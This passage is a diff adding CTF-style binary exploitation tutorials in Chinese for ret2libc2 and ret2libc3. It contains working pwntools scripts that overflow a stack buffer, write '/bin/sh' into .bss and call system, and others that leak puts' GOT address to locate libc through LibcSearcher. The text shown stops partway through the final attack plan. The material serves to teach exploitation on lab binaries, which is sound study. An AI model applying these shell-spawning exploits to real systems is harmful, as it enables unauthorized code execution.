@@ -1,6 +1,6 @@
 # pwn basic
 
-`更新时间：2025-3-10`
+`更新时间：2025-3-13`
 
 注释解释：
 
@@ -703,7 +703,7 @@ int caller(void) {
 
    > <img src="./img/17.png">
 
-3. `sub $0x10,%esp`：开辟内存空间，大小为`ESP`下面16个地址（字节）长度，即`int ret`声明变量
+3. `sub $0x10,%esp`：开辟内存空间，大小为`ESP`下面16个字节长度，即`int ret`声明变量
 
    > <img src="./img/18.png">
 
@@ -1792,3 +1792,239 @@ io.interactive()
 > <img src="./img/80.png">
 
 执行脚本，成功`getshell`
+
+### ret2libc2
+
+这道题实际上就是`ret2libc1`的改版，删除了程序内部写死的`"/bin/sh"`，需要我们自己手动输入
+
+#### 攻击流程
+
+1. 检查程序安全性
+
+> <img src="./img/81.png">
+
+与上题一致，可以进行栈溢出
+
+2. 查询`"/bin/sh"`
+
+> <img src="./img/82.png">
+
+很显然，这一次没有`"/bin/sh"`可用，需要我们手动写入
+
+3. 寻找`"/bin/sh"`编写位置
+
+如果我们要写入`"/bin/sh"`，就需要指定一个位置，对于一般的程序，可以写入的位置有`DATA`和`STACK`，而因为`ASLR`的保护，一般不写入栈中，因此这道题中，我们需要在数据段寻找可以写入的位置
+
+> <img src="./img/83.png">
+
+在`.bss`节中，我们可以发现一个缓冲区`buf2`，长度100字节，正好可以用于写入`"/bin/sh"`
+
+4. 查看`plt`表并记录地址
+
+> <img src="./img/84.png">
+
+5. 编写攻击脚本
+
+已知溢出长度为112字节，第一次返回地址为`gets@plt`，紧跟的是执行`gets()`后的返回地址`system@plt`，然后是`gets()`的参数，也就是`buf2`的地址，最后是`system()`的参数，同样是`buf2`的地址
+
+```py
+from pwn import *
+
+gets_plt = 0x8048460
+bss = 0x0804A080
+system_plt = 0x8048490
+bin_sh = b'/bin/sh\x00'
+payload = flat([b'a' * 112, gets_plt, system_plt, bss, bss])
+
+io = process('./ret2libc2')
+io.sendline(payload)
+io.sendline(bin_sh)
+io.interactive()
+```
+
+*注：这里的`"/bin/sh"`后面的`\x00`是截断符，防止末尾的换行符`\n`写入*
+
+执行脚本，成功`getshell`
+
+> <img src="./img/85.png">
+
+### ret2libc3
+
+上题中，题目删除了`"/bin/sh"`，我们需要自己传入`"/bin/sh"`并调用，而这题中，题目甚至删除了`system()`函数，我们需要自己调用`system()`函数
+
+首要任务便是寻找`system()`函数，实际上`system()`本身就是一个动态链接库中的函数，必定存在于动态链接库文件中。我们知道，动态链接的程序在每次执行时，都会将动态链接库中的内容复制到程序本体中，以便程序自身调用，复制的位置位于栈的低位
+
+> <img src="./img/86.png">
+
+如上图所示，栈的内存地址是`0xfffdd000`，而动态链接库是`0xf7ffd000 - 0xf7d64000`。那么，动态链接的内存有整整`2723840`字节，我们该怎么确定`system()`的位置，同时，我们还需要考虑，由于`ALSR`的开启，每次函数的位置都在不断的变化
+
+这里我们需要知道，在动态链接库复制进程序内存的时候，其内部的函数相对位置是保持不变的，这其实也就意味着，一旦我们能知道动态链接库中某个函数相对`system()`函数的偏移值，我们也就能间接调用`system()`函数，而且在动态链接库中，也存在`"/bin/sh"`字符串，也能供我们调用。根据这个原理，我们来进行攻击
+
+#### 攻击流程
+
+1. 检查文件安全性
+
+> <img src="./img/87.png">
+
+这题的重点是`RELRO`保护为`Partial RELRO`，如果是`FULL RELRO`，那么将无法进行攻击
+
+2. 寻找溢出点
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s[100]; // [esp+1Ch] [ebp-64h] BYREF
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  puts("No surprise anymore, system disappeard QQ.");
+  printf("Can you find it !?");
+  gets(s);
+  return 0;
+}
+```
+
+很显然，溢出点位于`gets(s)`，溢出长度同样是112字节
+
+3. 检查`plt`表
+
+> <img src="./img/88.png">
+
+为什么要检查`plt`表，因为`plt`表中记录了程序所有需要调用的外部函数，同时能供我们调用这些函数，由上文分析可知，一旦我们知道了某个函数的地址，又知道其相对于`system()`的偏移值，我们就能直接调用`system()`函数，那么，程序中存储外部函数的位置，也就是`got`表
+
+4. 检查`got`表
+
+> <img src="./img/89.png">
+
+图中可以看出，`printf()`、`gets()`、`puts()`和`__libc_start_main`因为已经被执行，因此能直接显示其真实地址。在远程端口中，虽然我们无法使用`pwndbg`查看`got`表，但是我们能利用`puts()`函数，将`got`表的内容打印出来
+
+5. `got`泄露
+
+先编写一个泄露`puts()`地址的脚本，在`pwntools`中，为我们提供了`plt`和`got`方法，能快捷地输出其地址，因为没有开启`PIE`保护，地址不会改变
+
+```py
+from pwn import *
+
+elf = ELF('./ret2libc3')
+sh = process('./ret2libc3')
+
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+
+payload = flat([b'a' * 112, puts_plt, b'bbbb', puts_got])
+// 指定接收位置在原程序输出之后
+sh.sendlineafter('Can you find it !?', payload)
+// u32()用于解码字节数据，与p32()相对
+// [0: 4]截断需要的内容，即前四位是puts的地址，后面的数据是无效数据
+// hex()用于将10进制转换为16进制
+print(hex(u32(sh.recv()[0: 4])))
+```
+
+执行脚本
+
+> <img src="./img/90.png">
+
+可以看到，程序成功输出了`puts()`函数的地址，接下来只需要知道`puts()`相对于`system()`的偏移值，就可以找到`system()`的地址
+
+6. 计算偏移
+
+计算偏移的方法有很多种，但在此之前需要知道，由于动态链接库`glibc`的版本多样性，不同版本的`glibc`中函数的相对偏移也不同，在使用不同方法计算偏移的时候，仍需考虑`glibc`版本不同带来的差异，比如本地使用的`glibc`是`glibc-2.40-1ubuntu3.1`版本，但是服务器使用的是`glibc-2.39-1ubuntu3.1`，那么我就不能仅使用本地`glibc`文件来计算偏移，而是需要使用服务器对应的版本进行计算
+
+- 本地与服务器版本一致时，直接编译c程序计算
+
+如果本地与服务器版本一致，那么我们可以直接编译一个包含`puts()`和`system()`函数的文件，并完全关闭`RELRO`保护，直接查看偏移值
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+	puts("abc");
+	system("ls");
+}
+```
+
+使用`gcc`编译，并关闭`RELRO`保护
+
+```sh
+gcc test.c -Wl,-z,norelro
+```
+
+确认`RELRO`保护完全关闭
+
+> <img src="./img/91.png">
+
+使用`pwndbg`查看`got`表
+
+> <img src="./img/92.png">
+
+上图中直接显示了两个函数的地址，其偏移值为`0xf7de1d80 - 0xf7db7410 = 174448`字节，故可知`system()`位于`puts()`低174448字节的位置
+
+- 本地版本与服务器不一致时，下载对应版本查看
+
+使用pwndbg编写脚本，直接计算`glibc`文件中的相对偏移
+
+```py
+from pwn import *
+
+elf = ELF('/lib/i386-linux-gnu/libc.so.6')
+
+puts_addr = elf.symbols['puts']
+system_addr = elf.symbols['system']
+
+print(puts_addr - system_addr)
+```
+
+然后得到结果
+
+> <img src="./img/93.png">
+
+- 使用`LibcSearcher`库快捷搜索
+
+`LibcSearcher`是一个基于`python`的快捷搜索指定动态链接函数特征，并计算地址的库，用法如下
+
+首先，创建一个`LibcSearcher`对象，参数是已经泄露的函数及其地址
+
+`libc = LibcSearcher('puts', puts_addr)`
+
+然后计算偏移量，这里的含义是通过`puts`在内存中的位置减去`puts`在`glibc`的绝对位置，得到`ALSR`的偏移量
+
+`libc_offset_base = puts_addr - libc.dump('puts')`
+
+然后计算`system()`在`glibc`的绝对位置，加上相对偏移，得到`system()`在内存中的位置
+
+`system_addr = libc_offset_base + libc.dump('system')`
+
+下面是攻击脚本
+
+```py
+from pwn import *
+from LibcSearcher import *
+
+elf = ELF('./ret2libc3')
+sh = process('./ret2libc3')
+
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+
+payload = flat([b'a' * 112, puts_plt, b'bbbb', puts_got])
+sh.sendlineafter('Can you find it !?', payload)
+
+puts_addr = u32(sh.recv()[0: 4])
+libc = LibcSearcher('puts', puts_addr)
+libc_base = puts_addr - libc.dump('puts')
+system_addr = libc_base + libc.dump('system')
+
+print(puts_addr - system_addr)
+```
+
+> <img src="./img/94.png">
+
+7. 构建攻击脚本
+
+其实可以发现，使用`LibcSearcher`库可以直接得到`system()`和`"/bin/sh"`的地址，因此我们直接通过`LibcSearcher`构建攻击脚本，但是在此之前，我们先捋一下攻击的过程
+
+- 首先栈溢出，返回地址`put@plt`，让程序执行`puts()`，参数为`puts@got`，带出`puts()`的实际地址
+- 然后程序需要返回`main()`函数，因为我们得到`puts()`的地址后，程序会继续进行下去，如果此时不返回`main()`函数，而是直接停止执行，那么得到的`puts()`函数的地址将没有任何意义
+- 程序返回`main()`函数重新执行，然后我们进行栈溢出
+
